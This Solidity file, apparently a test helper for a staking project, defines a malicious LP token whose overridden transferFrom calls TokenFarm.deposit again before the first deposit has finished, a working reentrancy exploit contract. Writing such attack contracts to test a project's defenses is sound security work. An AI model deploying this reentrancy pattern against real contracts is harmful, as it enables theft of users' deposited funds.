// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {LPToken} from "../src/LPToken.sol";
import {TokenFarm} from "../src/TokenFarm.sol";

// A malicious LP Token that re-enters the TokenFarm during a transferFrom call.
contract AttackLPToken is LPToken {
    TokenFarm public tokenFarm;
    address public attacker;
    uint256 public reenterAmount;

    constructor(
        address _initialOwner
    ) LPToken(_initialOwner) {}

    // Set up the contract for the attack
    function setAttackParams(address _attacker, address _farm, uint256 _reenterAmount) public {
        attacker = _attacker;
        tokenFarm = TokenFarm(_farm);
        reenterAmount = _reenterAmount;
    }

    // Override the transferFrom function to perform the re-entrancy attack
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // If the call is from the TokenFarm and for the attacker, re-enter.
        if (msg.sender == address(tokenFarm) && from == attacker) {
            // Re-entrancy: Call deposit again before the first call has finished.
            // This happens before the attacker's balance is updated in TokenFarm.
            tokenFarm.deposit(reenterAmount);
        }
        _transfer(from, to, amount);
        return true;
    }
}
